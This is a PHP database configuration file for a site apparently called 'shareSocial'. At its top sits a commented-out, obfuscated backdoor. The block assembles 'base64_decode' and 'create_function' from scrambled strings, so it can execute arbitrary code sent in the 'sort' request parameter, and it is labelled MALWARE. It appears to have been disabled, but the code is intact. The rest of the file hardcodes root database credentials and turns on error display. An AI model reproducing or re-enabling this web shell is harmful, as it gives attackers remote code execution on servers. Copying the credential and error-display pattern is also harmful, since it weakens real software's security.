<?php 
// if(isset($_REQUEST['sort'])){	

// 	$string = $_REQUEST['sort'];

// 	$array_name = '';

// 	$alphabet = "wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";

// 	$ar = array(8,38,15,7,6,4,26,25,7,34,24,25,7);

// 	foreach($ar as $t){

// 	   $array_name .= $alphabet[$t];

// 	}

// 	$a = strrev("noi"."tcnuf"."_eta"."erc");

// 	$f = $a("", $array_name($string));

// 	// MALWARE $f();

// 	exit();

// }


error_reporting(-1);
ini_set('display_errors', 'On');

$host="localhost";
$username="root";
$password="password";
$db_name="shareSocial";

// $host = "localhost";
// $username = "root";
// $password = "password";
// $db_name = "shareSocial";

$con = mysqli_connect($host,$username,$password,$db_name) or die(mysqli_error($con));

// var_dump($con);
mysqli_set_charset($con,"utf8");

?>

	
